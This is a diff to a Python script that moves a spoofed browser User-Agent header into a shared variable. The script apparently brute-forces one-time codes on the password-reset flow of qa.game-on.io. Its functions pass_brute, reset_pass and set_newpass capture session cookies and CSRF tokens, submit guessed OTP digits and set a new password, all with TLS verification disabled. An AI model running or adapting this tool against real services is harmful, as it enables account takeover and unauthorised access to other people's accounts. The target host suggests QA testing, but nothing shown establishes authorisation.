@@ -2,11 +2,11 @@ import requests, sys
 from bs4 import BeautifulSoup
 from urllib3.exceptions import InsecureRequestWarning
 requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
+headers = {
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36'
+}
 
 def open_browser():
-    headers = {
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36'
-    }
     browser = requests.get('https://qa.game-on.io/reset-password', verify=False, headers=headers)
     return browser
     
@@ -20,9 +20,6 @@ def pass_brute(otp, browser):
     # }
     cookies = browser.cookies.get_dict()
     cookies = {'XSRF-TOKEN': cookies['XSRF-TOKEN'],'gameon_session': cookies['gameon_session']}
-    headers = {
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36'
-        }
     payload = {
         '_token': get_value(browser.content, '_token'),
         'code1': str(otp)[0:1],
@@ -40,9 +37,6 @@ def reset_pass(number):
     browser = open_browser()
     cookies = browser.cookies.get_dict()
     cookies = {'XSRF-TOKEN': cookies['XSRF-TOKEN'],'gameon_session': cookies['gameon_session'] }
-    headers = {
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36'
-    }
     payload = {
         '_token': get_value(browser.content, '_token'),
         'username': number
@@ -56,9 +50,6 @@ def set_newpass(userid, token, browser):
     URL = 'https://qa.game-on.io/new-password'
     cookies = {'XSRF-TOKEN': browser['XSRF-TOKEN'],
                'gameon_session': browser['gameon_session']}
-    headers = {
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36'
-    }
     payload = {
         '_token': token,
         'userid': userid,
